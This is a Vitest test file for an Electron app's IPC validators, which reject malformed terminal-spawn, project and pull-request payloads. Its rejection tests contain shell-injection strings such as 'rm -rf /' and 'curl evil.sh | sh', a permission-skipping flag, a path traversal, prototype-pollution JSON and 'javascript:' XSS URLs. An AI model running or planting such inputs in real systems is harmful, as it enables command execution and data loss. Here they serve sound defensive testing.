// @vitest-environment node
import { describe, expect, it } from 'vitest';

import { CLONE_ENTITY_ID } from '../../../electron/shared/config-contract';

import {
  IpcValidationError,
  parseAddProjectRequest,
  parseBrowseDirRequest,
  parseCloneRequest,
  parseKillRequest,
  parseLedgerAnswerRequest,
  parseLedgerPostBody,
  parseLedgerReadQuery,
  parsePromptReport,
  parseRemoveProjectRequest,
  parseRenameProjectRequest,
  parseReorderProjectsRequest,
  parsePairDeviceRequest,
  parseRemotePairRequest,
  parseRepointProjectRequest,
  parseResizeRequest,
  parseRevokeDeviceRequest,
  parseSessionPrRequest,
  parseSetProjectAutoMergeRequest,
  parseSetProjectKeyRequest,
  parseSetProjectRuntimeRequest,
  parseSetReceiverRequest,
  parseSetRemoteRequest,
  parseSetServerRequest,
  parseSetSlackRequest,
  parseSetSlackTokensRequest,
  parseSpawnRequest,
  parseSpawnTerminalRequest,
  parseWriteRequest,
  parsePrLookup,
} from '../../../electron/shared/guards';

const validSpawn = { sessionId: 'sess-1', projectId: 'proj-1', cols: 80, rows: 24 };

/**
 * The guard matrix story 082 specifies: wrong type, missing field, extra field,
 * prototype-polluting key, and a non-string sessionId — for every payload.
 */
describe('parseSpawnRequest', () => {
  it('accepts a well-formed request and returns a typed value', () => {
    expect(parseSpawnRequest({ ...validSpawn })).toEqual(validSpawn);
  });

  it('does not pass through anything beyond the declared fields', () => {
    const parsed = parseSpawnRequest({ ...validSpawn });
    expect(Object.keys(parsed).sort()).toEqual([
      'cols',
      'projectId',
      'rows',
      'sessionId',
    ]);
  });

  describe('resume (HIVE-88)', () => {
    it('passes a boolean through', () => {
      expect(parseSpawnRequest({ ...validSpawn, resume: true }).resume).toBe(true);
      expect(parseSpawnRequest({ ...validSpawn, resume: false }).resume).toBe(false);
    });

    it('is absent when not sent', () => {
      expect(parseSpawnRequest({ ...validSpawn })).not.toHaveProperty('resume');
    });

    it('rejects anything that is not a boolean', () => {
      // A flag that picks which command-line flag a uuid goes behind; a string
      // here is a renderer bug, not a value to coerce.
      expect(() => parseSpawnRequest({ ...validSpawn, resume: 'yes' })).toThrow(
        /spawn\.resume/,
      );
    });
  });

  describe('name (HIVE-78)', () => {
    it('accepts an issue key and its de-duplicating suffix', () => {
      // The only two shapes the store constructs: `HIVE-73`, then `HIVE-73-2`
      // when a second session is opened for the same ticket.
      expect(parseSpawnRequest({ ...validSpawn, name: 'HIVE-73' })).toEqual({
        ...validSpawn,
        name: 'HIVE-73',
      });
      expect(parseSpawnRequest({ ...validSpawn, name: 'HIVE-73-2' })).toEqual({
        ...validSpawn,
        name: 'HIVE-73-2',
      });
    });

    it('omits the key entirely when it was not sent', () => {
      // Absent means main names the session after its entity id, which is
      // every spawn that did not come from a ticket card.
      expect(parseSpawnRequest({ ...validSpawn })).not.toHaveProperty('name');
    });

    it.each([
      ['a space', 'HIVE 73'],
      ['a quote', "HIVE-'73"],
      ['a backtick', 'HIVE-`73`'],
      ['a dollar', 'HIVE-$73'],
      ['a semicolon', 'HIVE-73; rm -rf /'],
      ['a pipe', 'HIVE-73 | sh'],
      ['an ampersand', 'HIVE-73 && curl evil.sh'],
      ['a newline', 'HIVE-73\nrm -rf /'],
      ['a leading hyphen, which would read as a flag', '--help'],
      ['an empty string', ''],
      ['a non-string', 42],
    ])('rejects %s', (_label, name) => {
      /**
       * Unlike `model` and `effort` this has no closed list behind it, so the
       * pattern *is* the defence — the value is interpolated into a command
       * line a login shell parses.
       *
       * Rejected here rather than dropped, which is what `bootstrap.ts` does
       * with the same value. Not a contradiction: main's own spawn path reaches
       * `bootstrap.ts` with no guard in between and needs a lenient fallback,
       * whereas a *renderer* sending an unsendable name built it wrongly and
       * should hear about it.
       */
      expect(() => parseSpawnRequest({ ...validSpawn, name })).toThrow(
        IpcValidationError,
      );
    });

    it('rejects a name past the sendable maximum', () => {
      expect(() =>
        parseSpawnRequest({ ...validSpawn, name: `A${'b'.repeat(64)}` }),
      ).toThrow(IpcValidationError);
    });
  });

  /**
   * The theme no longer crosses this boundary at all (HIVE-82).
   *
   * It used to be a closed set with a sharper reason than `model`'s: it chose
   * which of two settings files went on the command line, so an unknown value
   * named a path that was never written. There is one file now, and Claude's
   * own theme is pinned to `dark-ansi` inside it — an `-ansi` theme emits ANSI
   * indices, which xterm resolves against the active palette at paint time, so
   * a running session follows the app without being told anything.
   *
   * Asserted as a *rejection* rather than simply deleted: `assertShape` refuses
   * unexpected keys, so a renderer still sending one is a renderer that thinks
   * it is choosing something, and it should hear about it.
   */
  it('rejects a theme, which is no longer part of a spawn', () => {
    expect(() => parseSpawnRequest({ ...validSpawn, theme: 'dark' })).toThrow(
      IpcValidationError,
    );
  });

  describe('model and effort (story 109)', () => {
    it('accepts a member of each closed set', () => {
      expect(
        parseSpawnRequest({ ...validSpawn, model: 'haiku', effort: 'low' }),
      ).toEqual({ ...validSpawn, model: 'haiku', effort: 'low' });
    });

    it('omits the key entirely when it was not sent', () => {
      // An own property set to `undefined` is still a key after a structured
      // clone, and would become `--model undefined` on a command line.
      const parsed = parseSpawnRequest({ ...validSpawn });
      expect(parsed).not.toHaveProperty('model');
      expect(parsed).not.toHaveProperty('effort');
    });

    it.each([
      ['an unknown model', { model: 'gpt-4' }],
      ['a model differing only in case', { model: 'Opus' }],
      ['an unknown effort', { effort: 'xhigh' }],
      ['a non-string', { model: 42 }],
      ['an empty string', { effort: '' }],
    ])('rejects %s', (_label, patch) => {
      expect(() => parseSpawnRequest({ ...validSpawn, ...patch })).toThrow(
        IpcValidationError,
      );
    });

    it('rejects anything a shell could interpret', () => {
      /**
       * **The reason this field is an enum and not bounded free text.**
       *
       * These two values are the only thing the renderer contributes to a
       * command line main assembles and writes into a login shell. `assertText`
       * would pass every one of these — they are printable, short, and contain
       * no control characters — and each one would run something. Membership of
       * a fixed list is what makes the value unquotable rather than quoted.
       */
      for (const model of [
        'opus; rm -rf /',
        'opus && curl evil.sh | sh',
        'opus $(whoami)',
        'opus `id`',
        '--dangerously-skip-permissions',
      ]) {
        expect(() => parseSpawnRequest({ ...validSpawn, model })).toThrow(
          /expected one of/,
        );
      }
    });

    it('names the permitted values, for whoever added one to only one side', () => {
      expect(() =>
        parseSpawnRequest({ ...validSpawn, model: 'nope' }),
      ).toThrow(/spawn\.model: expected one of haiku, sonnet, opus, fable/);
    });
  });

  it.each([
    ['not an object', 'sess-1'],
    ['null', null],
    ['an array', []],
    ['undefined', undefined],
  ])('rejects %s', (_label, input) => {
    expect(() => parseSpawnRequest(input)).toThrow(IpcValidationError);
  });

  it('rejects a missing field', () => {
    const { cols: _cols, ...missing } = validSpawn;
    expect(() => parseSpawnRequest(missing)).toThrow(/missing key "cols"/);
  });

  it('rejects an extra field rather than ignoring it', () => {
    // An unexpected key means the two sides disagree about the contract.
    expect(() => parseSpawnRequest({ ...validSpawn, cwd: '/etc' })).toThrow(
      /unexpected key "cwd"/,
    );
  });

  it('rejects a prototype-polluting key', () => {
    // JSON.parse produces an OWN property named __proto__, which a spread
    // would carry into the next object.
    const polluted = JSON.parse(
      '{"sessionId":"s","projectId":"p","cols":80,"rows":24,"__proto__":{"admin":true}}',
    );
    expect(() => parseSpawnRequest(polluted)).toThrow(/forbidden key/);
  });

  it('rejects a non-string sessionId', () => {
    expect(() => parseSpawnRequest({ ...validSpawn, sessionId: 42 })).toThrow(
      /expected a string/,
    );
  });

  it.each([
    ['empty', ''],
    ['a path traversal', '../../etc/passwd'],
    ['a newline (log injection)', 'sess\n1'],
    ['a null byte', 'sess\u00001'],
    ['a shell metacharacter', 'sess;rm -rf /'],
    ['over 128 chars', 'a'.repeat(129)],
  ])('rejects a sessionId that is %s', (_label, id) => {
    expect(() => parseSpawnRequest({ ...validSpawn, sessionId: id })).toThrow(
      IpcValidationError,
    );
  });

  it.each([
    ['zero', 0],
    ['negative', -1],
    ['fractional', 80.5],
    ['absurd', 100_000],
    ['NaN', Number.NaN],
    ['a string', '80'],
  ])('rejects cols that is %s', (_label, cols) => {
    expect(() => parseSpawnRequest({ ...validSpawn, cols })).toThrow(
      IpcValidationError,
    );
  });
});

describe('parseSpawnRequest — the optional task', () => {
  it('accepts a request with no task at all', () => {
    expect(parseSpawnRequest({ ...validSpawn })).not.toHaveProperty('task');
  });

  it('accepts an ordinary task', () => {
    expect(
      parseSpawnRequest({ ...validSpawn, task: 'fix the hero' }).task,
    ).toBe('fix the hero');
  });

  it('accepts punctuation and non-ASCII text', () => {
    const task = 'rename “widget” → gadget (see #219)';
    expect(parseSpawnRequest({ ...validSpawn, task }).task).toBe(task);
  });

  /**
   * The task is written into a pty, so a control character is not a
   * formatting quirk — it is an instruction to a terminal the user trusts.
   */
  it('rejects a carriage return, which would submit a line nobody typed', () => {
    expect(() =>
      parseSpawnRequest({ ...validSpawn, task: 'ls\rrm -rf /' }),
    ).toThrow(/control characters/);
  });

  it('rejects an escape byte, which could address the cursor', () => {
    expect(() =>
      parseSpawnRequest({ ...validSpawn, task: 'a\u001b[31mb' }),
    ).toThrow(/control characters/);
  });

  it('rejects a NUL', () => {
    expect(() =>
      parseSpawnRequest({ ...validSpawn, task: 'a\u0000b' }),
    ).toThrow(IpcValidationError);
  });

  it('rejects an unbounded task', () => {
    expect(() =>
      parseSpawnRequest({ ...validSpawn, task: 'x'.repeat(4097) }),
    ).toThrow(/too long/);
  });

  it('rejects an empty task rather than spawning a blank instruction', () => {
    expect(() => parseSpawnRequest({ ...validSpawn, task: '' })).toThrow(
      /must not be empty/,
    );
  });

  it('rejects a non-string task', () => {
    expect(() => parseSpawnRequest({ ...validSpawn, task: 42 })).toThrow(
      IpcValidationError,
    );
  });

  it('still rejects an unexpected key — optional is not a free-for-all', () => {
    expect(() => parseSpawnRequest({ ...validSpawn, nope: 1 })).toThrow(
      /unexpected key/,
    );
  });

  it('still rejects a missing required key', () => {
    const { cols: _cols, ...missing } = validSpawn;
    expect(() => parseSpawnRequest({ ...missing, task: 'x' })).toThrow(
      /missing key "cols"/,
    );
  });
});

describe('parseWriteRequest', () => {
  it('accepts keystrokes', () => {
    expect(parseWriteRequest({ sessionId: 'sess-1', data: 'ls -la\r' })).toEqual({
      sessionId: 'sess-1',
      data: 'ls -la\r',
    });
  });

  it('allows control characters in data — they are keystrokes, not content', () => {
    // Ctrl-C. Never interpreted here; only written to a pty's stdin.
    const parsed = parseWriteRequest({ sessionId: 'sess-1', data: '\u0003' });
    expect(parsed.data).toBe('\u0003');
  });

  it('rejects a missing field, an extra field, and a bad id', () => {
    expect(() => parseWriteRequest({ sessionId: 'sess-1' })).toThrow(/missing key/);
    expect(() =>
      parseWriteRequest({ sessionId: 'sess-1', data: 'x', echo: true }),
    ).toThrow(/unexpected key/);
    expect(() => parseWriteRequest({ sessionId: 12, data: 'x' })).toThrow(
      /expected a string/,
    );
  });

  it('rejects non-string data', () => {
    expect(() =>
      parseWriteRequest({ sessionId: 'sess-1', data: { toString: 'evil' } }),
    ).toThrow(/expected a string/);
  });
});

describe('parseResizeRequest', () => {
  it('accepts geometry', () => {
    expect(parseResizeRequest({ sessionId: 's1', cols: 120, rows: 40 })).toEqual({
      sessionId: 's1',
      cols: 120,
      rows: 40,
    });
  });

  it('rejects the whole matrix', () => {
    expect(() => parseResizeRequest(null)).toThrow(IpcValidationError);
    expect(() => parseResizeRequest({ sessionId: 's1', cols: 80 })).toThrow(
      /missing key "rows"/,
    );
    expect(() =>
      parseResizeRequest({ sessionId: 's1', cols: 80, rows: 24, pixel: 1 }),
    ).toThrow(/unexpected key/);
    expect(() => parseResizeRequest({ sessionId: [], cols: 80, rows: 24 })).toThrow(
      /expected a string/,
    );
  });
});

/**
 * The renderer's report about a session's input box (HIVE-135). Three
 * literals and nothing else: a report is what lets main write into a
 * terminal, so an unknown word must not be read as permission.
 */
describe('parsePromptReport', () => {
  it.each(['empty', 'draft', 'unfocused'] as const)('accepts %s', (input) => {
    expect(parsePromptReport({ sessionId: 'sess-1', input })).toEqual({
      sessionId: 'sess-1',
      input,
    });
  });

  it('rejects the whole matrix', () => {
    expect(() => parsePromptReport(null)).toThrow(IpcValidationError);
    expect(() => parsePromptReport({ sessionId: 'sess-1' })).toThrow(/missing key "input"/);
    expect(() => parsePromptReport({ sessionId: 'sess-1', input: 'empty', seq: 1 })).toThrow(
      /unexpected key/,
    );
    expect(() => parsePromptReport({ sessionId: [], input: 'empty' })).toThrow(
      /expected a string/,
    );
    expect(() => parsePromptReport({ sessionId: 'sess-1', input: 'yes' })).toThrow(
      IpcValidationError,
    );
    expect(() => parsePromptReport({ sessionId: 'sess-1', input: 1 })).toThrow(
      IpcValidationError,
    );
  });
});

describe('parseKillRequest', () => {
  it('accepts a bare session id', () => {
    expect(parseKillRequest('sess-1')).toBe('sess-1');
  });

  it('rejects a non-string, an empty string, and a malformed id', () => {
    expect(() => parseKillRequest(42)).toThrow(/expected a string/);
    expect(() => parseKillRequest('')).toThrow(/malformed id/);
    expect(() => parseKillRequest('../other')).toThrow(/malformed id/);
  });

  it('rejects an object masquerading as an id', () => {
    expect(() => parseKillRequest({ toString: () => 'sess-1' })).toThrow(
      /expected a string/,
    );
  });
});

describe('parseBrowseDirRequest', () => {
  it('accepts an absolute path', () => {
    expect(parseBrowseDirRequest({ path: '/Users/me/Projects' })).toEqual({
      path: '/Users/me/Projects',
    });
  });

  /**
   * The one place this guard deliberately differs from
   * `parseAddProjectRequest`: an empty string is how the picker asks for home
   * on its first call, where for `addProject` it would mean the caller named
   * nowhere.
   */
  it('accepts an empty path and a bare tilde, both meaning home', () => {
    expect(parseBrowseDirRequest({ path: '' })).toEqual({ path: '' });
    expect(parseBrowseDirRequest({ path: '~' })).toEqual({ path: '~' });
  });

  it('rejects __proto__', () => {
    expect(() =>
      parseBrowseDirRequest(JSON.parse('{"path":"/x","__proto__":{}}')),
    ).toThrow(/forbidden key/);
  });

  it('rejects a non-object, a missing path, a non-string path and an extra key', () => {
    expect(() => parseBrowseDirRequest(42)).toThrow(/expected an object/);
    expect(() => parseBrowseDirRequest(null)).toThrow(/expected an object/);
    expect(() => parseBrowseDirRequest([])).toThrow(/expected an object/);
    expect(() => parseBrowseDirRequest({})).toThrow(/missing key "path"/);
    expect(() => parseBrowseDirRequest({ path: 7 })).toThrow(/expected a string/);
    expect(() => parseBrowseDirRequest({ path: '/x', depth: 3 })).toThrow(
      /unexpected key/,
    );
  });

  it('rejects a path past the length bound', () => {
    expect(() => parseBrowseDirRequest({ path: `/${'x'.repeat(4096)}` })).toThrow(
      /too long/,
    );
  });

  /**
   * Neither is a containment hole — `browseHomeDirectory` refuses both once it
   * resolves them — but a NUL only reaches the caller as a flattened
   * `EUNKNOWN`, and a newline reaches the syscall layer intact and forges a
   * second line in anything that logs the path. Refused before either happens.
   */
  it.each([
    ['a NUL', '/Users/me\u0000/etc'],
    ['a newline', '/Users/me\nProjects'],
    ['a carriage return', '/Users/me\rProjects'],
    ['a DEL', '/Users/me\u007fProjects'],
  ])('rejects %s in the path', (_label, path) => {
    expect(() => parseBrowseDirRequest({ path })).toThrow(/control character/);
  });

  it('allows the characters a real path actually contains', () => {
    const path = '/Users/me/Projects/my app (2) — copy.d/ünïcode';
    expect(parseBrowseDirRequest({ path })).toEqual({ path });
  });

  /**
   * Traversal is not this guard's job and must not become it. `..` is
   * syntactically a fine path; what refuses it is `browseHomeDirectory`
   * resolving and containing the result. Two validators with different ideas
   * about what a path may contain is how a rule gets quietly relaxed.
   */
  it('passes traversal through untouched, for main to resolve and refuse', () => {
    expect(parseBrowseDirRequest({ path: '/Users/me/../../etc' })).toEqual({
      path: '/Users/me/../../etc',
    });
  });
});

describe('parseAddProjectRequest', () => {
  it('accepts a path alone and a path with a name', () => {
    expect(parseAddProjectRequest({ path: '/tmp/x' })).toEqual({ path: '/tmp/x' });
    expect(parseAddProjectRequest({ path: '/tmp/x', name: 'X' })).toEqual({
      path: '/tmp/x',
      name: 'X',
    });
  });

  it('does not create an own name key when none was sent', () => {
    // An `undefined`-valued own key would be written to the config file and
    // reported as unknown the next time it is read.
    expect(Object.keys(parseAddProjectRequest({ path: '/tmp/x' }))).toEqual(['path']);
  });

  it('rejects __proto__', () => {
    expect(() =>
      parseAddProjectRequest(JSON.parse('{"path":"/tmp/x","__proto__":{}}')),
    ).toThrow(/forbidden key/);
  });

  it('rejects a non-string path, a missing path, and an unexpected key', () => {
    expect(() => parseAddProjectRequest({ path: 7 })).toThrow(/expected a string/);
    expect(() => parseAddProjectRequest({})).toThrow(/missing key "path"/);
    expect(() => parseAddProjectRequest({ path: '/x', nope: 1 })).toThrow(
      /unexpected key/,
    );
  });

  it('rejects an empty or whitespace-only path', () => {
    expect(() => parseAddProjectRequest({ path: '' })).toThrow(/non-empty/);
    expect(() => parseAddProjectRequest({ path: '   ' })).toThrow(/non-empty/);
  });

  it('rejects an empty name', () => {
    expect(() => parseAddProjectRequest({ path: '/x', name: '' })).toThrow(
      /must not be empty/,
    );
  });

  /**
   * `name` is a display string, so it takes the bounded, control-character-free
   * guard rather than the deliberately permissive path one. A renderer that
   * skipped the dialog could otherwise persist an unbounded name into the
   * config, and control characters would reach a file the user hand-edits.
   */
  it('bounds the name and rejects control characters in it', () => {
    expect(() =>
      parseAddProjectRequest({ path: '/x', name: 'a'.repeat(4097) }),
    ).toThrow(/too long/);
    expect(() =>
      parseAddProjectRequest({ path: '/x', name: 'evil\u001b[2Jname' }),
    ).toThrow(/control characters/);
  });

  it('still accepts an unbounded path, which is about to be realpath-ed', () => {
    const deep = `/${'nested/'.repeat(700)}repo`;
    expect(parseAddProjectRequest({ path: deep }).path).toBe(deep);
  });
});

describe('parseRemoveProjectRequest', () => {
  it('accepts an id', () => {
    expect(parseRemoveProjectRequest({ id: 'the-hive' })).toEqual({ id: 'the-hive' });
  });

  it('rejects a malformed id, a missing id, and __proto__', () => {
    expect(() => parseRemoveProjectRequest({ id: '../etc' })).toThrow(/malformed id/);
    expect(() => parseRemoveProjectRequest({})).toThrow(/missing key "id"/);
    expect(() =>
      parseRemoveProjectRequest(JSON.parse('{"id":"a","__proto__":{}}')),
    ).toThrow(/forbidden key/);
  });
});

describe('parseCloneRequest', () => {
  const validClone = {
    url: 'https://github.com/behiques/the-hive.git',
    parentPath: '/Users/me/Projects',
    cols: 80,
    rows: 24,
  };

  it('accepts a well-formed request', () => {
    expect(parseCloneRequest(validClone)).toEqual(validClone);
  });

  it('rejects a missing key', () => {
    const { url: _url, ...rest } = validClone;
    expect(() => parseCloneRequest(rest)).toThrow(IpcValidationError);
  });

  /**
   * The key that matters most: a renderer naming where the clone should land
   * is refused before main sees it, which is what keeps the epic's "no verb
   * takes a destination path" rule true for this story.
   */
  it('rejects a destination key', () => {
    expect(() =>
      parseCloneRequest({ ...validClone, destination: '/etc' }),
    ).toThrow(IpcValidationError);
  });

  it('rejects __proto__', () => {
    const payload = JSON.parse(
      '{"url":"https://x/y.git","parentPath":"/p","cols":80,"rows":24,"__proto__":{"admin":true}}',
    ) as unknown;
    expect(() => parseCloneRequest(payload)).toThrow(IpcValidationError);
  });

  it('rejects a non-string url', () => {
    expect(() => parseCloneRequest({ ...validClone, url: 42 })).toThrow(
      IpcValidationError,
    );
  });

  it('rejects an empty parentPath', () => {
    expect(() => parseCloneRequest({ ...validClone, parentPath: '  ' })).toThrow(
      IpcValidationError,
    );
  });

  it('rejects a non-integer cols', () => {
    expect(() => parseCloneRequest({ ...validClone, cols: 1.5 })).toThrow(
      IpcValidationError,
    );
  });

  it('rejects a zero rows', () => {
    expect(() => parseCloneRequest({ ...validClone, rows: 0 })).toThrow(
      IpcValidationError,
    );
  });
});

/**
 * The clone entity id has to survive the id guard (story 102).
 *
 * It travels on `pty:write` as `sessionId`, and `pty:write` is a `send`
 * channel — a rejected payload is logged and dropped, never returned. So an id
 * this guard refuses does not fail loudly: every keystroke vanishes, the
 * terminal keeps blinking its cursor, and no credential prompt can ever be
 * answered. That is the whole reason the story runs `git` in a PTY, so it is
 * worth a test of its own rather than trust in a constant.
 */
describe('CLONE_ENTITY_ID', () => {
  it('is accepted wherever a session id is validated', () => {
    expect(parseKillRequest(CLONE_ENTITY_ID)).toBe(CLONE_ENTITY_ID);
    expect(
      parseWriteRequest({ sessionId: CLONE_ENTITY_ID, data: 'hunter2\r' }),
    ).toEqual({ sessionId: CLONE_ENTITY_ID, data: 'hunter2\r' });
    expect(
      parseResizeRequest({ sessionId: CLONE_ENTITY_ID, cols: 80, rows: 24 }),
    ).toMatchObject({ sessionId: CLONE_ENTITY_ID });
  });

  /** A colon is the specific character that broke this in development. */
  it('contains no character the id guard rejects', () => {
    expect(CLONE_ENTITY_ID).not.toContain(':');
    expect(CLONE_ENTITY_ID).toMatch(/^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$/);
  });

  /**
   * `deriveProjectId` kebabs a basename to `[a-z0-9-]`, so a dot is a character
   * it can never emit — which is what makes a collision impossible.
   */
  it('cannot be produced by project-id derivation', () => {
    expect(CLONE_ENTITY_ID).toContain('.');
  });
});

/**
 * Story 103's three mutating payloads.
 *
 * Same matrix as story 101's: wrong type, missing field, extra field, and a
 * prototype-polluting key. The additions specific to this story are the ones
 * about *display* text — a name is rendered rather than resolved, so it is
 * bounded and control-character free where a path deliberately is not.
 */
describe('parseRenameProjectRequest', () => {
  it('accepts an id and a display name', () => {
    expect(parseRenameProjectRequest({ id: 'the-hive', name: 'The Hive' })).toEqual({
      id: 'the-hive',
      name: 'The Hive',
    });
  });

  it('trims the name, so a padded one cannot masquerade as different', () => {
    expect(parseRenameProjectRequest({ id: 'a', name: '  The Hive  ' })).toEqual({
      id: 'a',
      name: 'The Hive',
    });
  });

  it('rejects an empty or whitespace-only name', () => {
    expect(() => parseRenameProjectRequest({ id: 'a', name: '' })).toThrow(
      /must not be empty/,
    );
    expect(() => parseRenameProjectRequest({ id: 'a', name: '   ' })).toThrow(
      /must not be empty/,
    );
  });

  it('rejects control characters and over-long names', () => {
    expect(() => parseRenameProjectRequest({ id: 'a', name: 'x\ny' })).toThrow(
      /control characters/,
    );
    expect(() =>
      parseRenameProjectRequest({ id: 'a', name: 'x'.repeat(4097) }),
    ).toThrow(/too long/);
  });

  it('rejects unknown keys, __proto__ and a missing field', () => {
    expect(() =>
      parseRenameProjectRequest({ id: 'a', name: 'b', extra: 1 }),
    ).toThrow(/unexpected key/);
    expect(() =>
      parseRenameProjectRequest(JSON.parse('{"id":"a","name":"b","__proto__":{}}')),
    ).toThrow(/forbidden key/);
    expect(() => parseRenameProjectRequest({ id: 'a' })).toThrow(/missing key/);
  });

  it('rejects a non-string name and a malformed id', () => {
    expect(() => parseRenameProjectRequest({ id: 'a', name: 7 })).toThrow(
      IpcValidationError,
    );
    expect(() => parseRenameProjectRequest({ id: 'a b', name: 'c' })).toThrow(
      /renameProject.id/,
    );
  });
});

describe('parseRepointProjectRequest', () => {
  it('accepts an id and a path, keeping the path verbatim', () => {
    expect(
      parseRepointProjectRequest({ id: 'the-hive', path: '~/Projects/hive' }),
    ).toEqual({ id: 'the-hive', path: '~/Projects/hive' });
  });

  it('rejects an empty path and an unknown key', () => {
    expect(() => parseRepointProjectRequest({ id: 'a', path: '  ' })).toThrow(
      /expected a non-empty string/,
    );
    expect(() =>
      parseRepointProjectRequest({ id: 'a', path: '/x', to: '/y' }),
    ).toThrow(/unexpected key/);
  });

  it('rejects __proto__ and a missing field', () => {
    expect(() =>
      parseRepointProjectRequest(JSON.parse('{"id":"a","path":"/x","__proto__":{}}')),
    ).toThrow(/forbidden key/);
    expect(() => parseRepointProjectRequest({ id: 'a' })).toThrow(/missing key/);
  });

  /**
   * A path is about to be `realpath`'d, so it gets the permissive guard — the
   * same call `parseAddProjectRequest` makes. Main is the gate, not this.
   */
  it('does not bound the path the way it bounds a display name', () => {
    const long = `/${'x'.repeat(5000)}`;
    expect(parseRepointProjectRequest({ id: 'a', path: long }).path).toBe(long);
  });
});

describe('parseReorderProjectsRequest', () => {
  it('accepts an array of ids and returns them in order', () => {
    expect(parseReorderProjectsRequest({ ids: ['a', 'b', 'c'] })).toEqual({
      ids: ['a', 'b', 'c'],
    });
  });

  it('accepts an empty list', () => {
    expect(parseReorderProjectsRequest({ ids: [] })).toEqual({ ids: [] });
  });

  it('rejects a non-array', () => {
    expect(() => parseReorderProjectsRequest({ ids: 'a' })).toThrow(
      /expected an array/,
    );
  });

  it('names the offending index when an id is malformed', () => {
    expect(() => parseReorderProjectsRequest({ ids: ['a', 'a b'] })).toThrow(
      /reorderProjects\.ids\[1\]/,
    );
  });

  /**
   * A duplicate can never be a permutation of the file's ids, so rejecting it
   * here keeps the verb's own check a plain set comparison.
   */
  it('rejects a duplicate id', () => {
    expect(() => parseReorderProjectsRequest({ ids: ['a', 'a'] })).toThrow(
      /duplicate id/,
    );
  });

  /**
   * `.map`, `.every` and `Set` all skip array holes, so a sparse array could
   * satisfy every check and still return a value violating its own
   * `readonly string[]` type — putting a literal `null` into the config file.
   * A `contextBridge` clone densifies it today; main's only shape guard should
   * not rest on a renderer-side implementation detail.
   */
  it('rejects a sparse array rather than passing the hole through', () => {
    const sparse = ['a', 'b'];
    delete sparse[0];
    expect(() => parseReorderProjectsRequest({ ids: sparse })).toThrow(
      /reorderProjects\.ids\[0\]/,
    );
  });

  /** Bounded like every other guard here: the real value is bounded by disk. */
  it('rejects an absurdly long list', () => {
    const ids = Array.from({ length: 1001 }, (_unused, index) => `p${index}`);
    expect(() => parseReorderProjectsRequest({ ids })).toThrow(/too many ids/);
    expect(() =>
      parseReorderProjectsRequest({ ids: ids.slice(0, 1000) }),
    ).not.toThrow();
  });

  it('rejects unknown keys and __proto__', () => {
    expect(() => parseReorderProjectsRequest({ ids: [], extra: 1 })).toThrow(
      /unexpected key/,
    );
    expect(() =>
      parseReorderProjectsRequest(JSON.parse('{"ids":[],"__proto__":{}}')),
    ).toThrow(/forbidden key/);
  });
});

/**
 * `config:set-project-key` (HIVE-94).
 *
 * The same matrix story 082 specifies, plus the one rule this payload has that
 * no other does: the key's alphabet is closed. `[a-z]{2,4}` is narrower than
 * `assertId`, deliberately — nothing that reaches a `cwd`, a lookup table or a
 * log line can be smuggled through a field that accepts only letters.
 *
 * Uniqueness is **not** checked here and could not be: whether a key is taken
 * is a fact about the file main is about to write, which this guard cannot see.
 * That check lives inside the write's mutation.
 */
describe('parseSetProjectAutoMergeRequest', () => {
  it('accepts an id and a boolean', () => {
    expect(parseSetProjectAutoMergeRequest({ id: 'the-hive', autoMerge: true })).toEqual({
      id: 'the-hive',
      autoMerge: true,
    });
  });

  it.each([['a string', 'yes'], ['a number', 1], ['absent', undefined]])(
    'refuses %s for autoMerge',
    (_label, value) => {
      expect(() => parseSetProjectAutoMergeRequest({ id: 'a', autoMerge: value })).toThrow();
    },
  );
});

describe('parseSetProjectKeyRequest', () => {
  it('accepts an id and a key', () => {
    expect(parseSetProjectKeyRequest({ id: 'the-hive', key: 'hive' })).toEqual({
      id: 'the-hive',
      key: 'hive',
    });
  });

  it('trims, the way a display name is trimmed', () => {
    // The inline editor commits on blur, and a key that arrived with a trailing
    // space would be refused for a reason invisible on screen.
    expect(parseSetProjectKeyRequest({ id: 'a', key: ' hive ' }).key).toBe('hive');
  });

  it.each([
    ['one letter', 'h'],
    ['five letters', 'hivey'],
    ['uppercase', 'Hive'],
    ['a digit', 'hiv3'],
    ['a separator', 'hi-e'],
    ['empty', ''],
    ['whitespace only', '   '],
    ['not a string', 42],
  ])('refuses a key that is %s', (_label, key) => {
    expect(() => parseSetProjectKeyRequest({ id: 'a', key })).toThrow(
      IpcValidationError,
    );
  });

  it('refuses a missing field, an extra field, and a malformed id', () => {
    expect(() => parseSetProjectKeyRequest({ id: 'a' })).toThrow(
      IpcValidationError,
    );
    expect(() =>
      parseSetProjectKeyRequest({ id: 'a', key: 'ab', extra: 1 }),
    ).toThrow(IpcValidationError);
    expect(() => parseSetProjectKeyRequest({ id: '../x', key: 'ab' })).toThrow(
      IpcValidationError,
    );
  });

  it('refuses a prototype-polluting key', () => {
    expect(() =>
      parseSetProjectKeyRequest(
        JSON.parse('{"id":"a","key":"ab","__proto__":{"x":1}}'),
      ),
    ).toThrow(IpcValidationError);
  });
});

/**
 * `session:pr` — the renderer telling main which pull request a session
 * produced.
 *
 * The interesting field is `url`, and it is the only one on this bridge that
 * later becomes an `href`: the renderer reads it back out of its own session
 * history and puts it on a link, which is the shape of a stored-XSS carrier. `assertText`
 * would let `javascript:` straight through, so the scheme is checked here — and
 * *only* the scheme, because the host is GitHub's business and pinning it would
 * break the moment somebody points the app at an enterprise instance.
 */
describe('parseSessionPrRequest', () => {
  const pr = {
    number: 118,
    repo: 'nova-web',
    url: 'https://github.com/demo/nova-web/pull/118',
  };

  it('accepts a well-formed note', () => {
    expect(parseSessionPrRequest({ entityId: 'sess-1', pr })).toEqual({
      entityId: 'sess-1',
      pr,
    });
  });

  it.each([
    ['a javascript: url', 'javascript:alert(1)'],
    ['a data: url', 'data:text/html,<script>alert(1)</script>'],
    ['plain http', 'http://github.com/demo/nova-web/pull/118'],
    ['a relative path', '/demo/nova-web/pull/118'],
    ['not a url at all', 'nova-web#118'],
    ['not a string', 118],
  ])('refuses %s', (_label, url) => {
    expect(() => parseSessionPrRequest({ entityId: 'sess-1', pr: { ...pr, url } })).toThrow(
      IpcValidationError,
    );
  });

  it.each([
    ['zero', 0],
    ['negative', -1],
    ['fractional', 1.5],
    ['absurd', 1e12],
    ['not a number', '118'],
  ])('refuses a PR number that is %s', (_label, number) => {
    expect(() =>
      parseSessionPrRequest({ entityId: 'sess-1', pr: { ...pr, number } }),
    ).toThrow(IpcValidationError);
  });

  it('refuses a missing field, an extra field, and a malformed id', () => {
    expect(() => parseSessionPrRequest({ entityId: 'sess-1' })).toThrow(
